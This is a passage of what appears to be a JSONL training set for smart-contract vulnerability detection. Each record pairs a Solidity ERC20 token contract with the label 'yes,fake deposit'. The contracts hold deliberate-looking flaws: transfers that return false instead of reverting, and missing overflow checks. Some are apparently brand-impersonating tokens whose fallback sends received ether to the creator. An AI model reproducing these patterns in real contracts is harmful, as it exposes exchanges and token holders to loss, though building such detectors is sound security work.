tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 10000000000; // Update total supply (100000 for example)\n name = \"Elonex\"; // Set the name for display purposes\n decimals = 2; // Amount of decimals for display purposes\n symbol = \"Elonex\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Unlicense\n\n// ----------------------------------------------------------------------------\n// 'McAfeeGhost' token contract\n//\n// Symbol : AGHOST \ud83d\udc7b\n// Name : McAfee Ghost\n// Total supply: 100,000,000,000,000\n// Decimals : 18\n// Burned : 50%\n// ----------------------------------------------------------------------------\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract McAfeeGhost is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 100000000000000*10**uint256(decimals);\n string public constant name = \"McAfee Ghost\";\n string public constant symbol = \"AGHOST \ud83d\udc7b\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n function totalSupply() constant returns (uint256 supply) {}\n\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\ncontract ERC20Token is StandardToken {\n\n function () {\n throw;\n }\n\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000;\n totalSupply = 10000000;\n name = \"Nude NFT\";\n decimals = 0;\n symbol = \"NUDE\";\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //uint256 _limit = .01*10000000000000000000;\n // && _value <= _limit\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract BitSound is StandardToken {\n\n function (){\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n function BitSound() {\n balances[msg.sender] = 3000000000000000000;\n totalSupply = 1500000000000000000;\n name = \"BitSound\";\n decimals = 10;\n symbol = \"NOISE\";\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract SHIBA_INU_2 is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000*10**uint256(decimals);\n string public constant name = \"SHIBA INU 2\";\n string public constant symbol = \"SHIB2\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n \n function () external payable {\n teamAddress.transfer(msg.value);\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.25;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n \n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract JapaneseSpitz is StandardToken { \n\n \n\n \n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'Spitz.0'; \n uint256 public unitsOneEthCanBuy; \n uint256 public totalEthInWei; \n address public fundsWallet; \n\n \n function JapaneseSpitz() {\n balances[msg.sender] = 10000000000000000000000000000; \n totalSupply = 10000000000000000000000000000;\n name = \"Japanese Spitz\";\n decimals = 18; \n symbol = \"Spitz\"; \n unitsOneEthCanBuy = 0; //7% bonus= OneEth// \n fundsWallet = msg.sender; \n }\n\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n\n Transfer(fundsWallet, msg.sender, amount); \n\n fundsWallet.transfer(msg.value); \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name; //Name of the token\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol; //An identifier: eg AXM\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 1000000; // Update total supply (100000 for example)\n name = \"FennyPenny\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals\n symbol = \"FP\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.5.0;\n\n\ninterface ERC20Interface {\n \n function totalSupply() external view returns (uint256);\n\n \n function balanceOf(address account) external view returns (uint256);\n\n \n function transfer(address recipient, uint256 amount) external returns (bool);\n\n \n function allowance(address owner, address spender) external view returns (uint256);\n\n \n function approve(address spender, uint256 amount) external returns (bool);\n\n \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n \n event Transfer(address indexed from, address indexed to, uint256 value);\n\n \n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract ERC20Base is ERC20Interface {\n // Empty internal constructor, to prevent people from mistakenly deploying\n // an instance of this contract, which should be used via inheritance.\n // constructor () internal { }\n // solhint-disable-previous-line no-empty-blocks\n\n mapping (address => uint256) public _balances;\n mapping (address => mapping (address => uint256)) public _allowances;\n uint256 public _totalSupply;\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (_balances[msg.sender] >= _value && _value > 0) {\n _balances[msg.sender] -= _value;\n _balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { \n return false;\n }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\n _balances[_to] += _value;\n _balances[_from] -= _value;\n _allowances[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return _balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n _allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return _allowances[_owner][_spender];\n }\n \n function totalSupply() public view returns (uint256 total) {\n return _totalSupply;\n }\n}\n\ncontract FaircoverCoin is ERC20Base {\n\n string private _name;\n string private _symbol;\n uint8 private _decimals;\n \n constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\n _name = name;\n _symbol = symbol;\n _decimals = decimals;\n _totalSupply = initialSupply * 10 ** uint256(decimals);\n _balances[msg.sender] = initialSupply * 10 ** uint256(decimals);\n }\n\n \n function name() public view returns (string memory) {\n return _name;\n }\n\n \n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n \n function decimals() public view returns (uint8) {\n return _decimals;\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract SpongebobSquarepantsToken is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Spongebob Squarepants Token\";\n string public constant symbol = \"SPONGE \ud83e\uddfd\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: MIT\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract TwitterOfficial is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 100000000000000*10**uint256(decimals);\n string public constant name = \"Twitter Token (Official)\";\n string public constant symbol = \"TTKN\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Teenage_Mutant_Ninja_Turtles_Finance is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 2100000*10**uint256(decimals);\n string public constant name = \"Teenage Mutant Ninja Turtles Finance\";\n string public constant symbol = \"TMNT\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit 